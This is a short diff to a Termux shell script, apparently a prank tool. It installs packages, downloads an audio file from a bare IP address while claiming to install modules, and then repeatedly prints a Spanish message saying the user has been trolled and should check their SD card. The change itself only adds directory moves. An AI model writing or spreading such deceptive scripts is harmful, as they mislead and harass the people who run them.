@@ -10,6 +10,7 @@ sleep 5
 termux-setup-storage
 pkg install mpv -y
 pkg install wget -y
+cd ..
 wget http://35.226.60.71/ssh.wav
 clear
 printf "\e[1;32m Modulos instalados.. aguarde\n"
@@ -149,6 +150,7 @@ for i in {1..10}
 do
  printf "\e[1;35mHAS SIDO TROLEADO REVISA TU SDCARD\n"
 done
+cd $home
 mpv ssh.wav
 mpv ssh.wav
 
